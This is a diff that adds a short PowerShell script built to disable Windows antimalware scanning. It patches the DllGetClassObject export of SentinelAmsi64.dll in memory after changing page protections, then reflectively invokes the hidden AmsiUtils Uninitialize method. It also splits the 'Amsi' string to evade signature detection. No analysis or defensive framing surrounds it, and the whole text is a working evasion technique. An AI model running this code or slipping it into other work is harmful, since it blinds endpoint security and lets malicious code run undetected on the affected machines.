@@ -1,0 +1,11 @@
+Add-Type $APIs
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+$LoadLibrary = [APIs]::LoadLibrary("SentinelAmsi64.dll")
+$Address = [APIs]::GetProcAddress($LoadLibrary,
+"DllGetClassObject")
+$p = 0
+[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
+$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
+$Uninitialize.Invoke($object,$null)
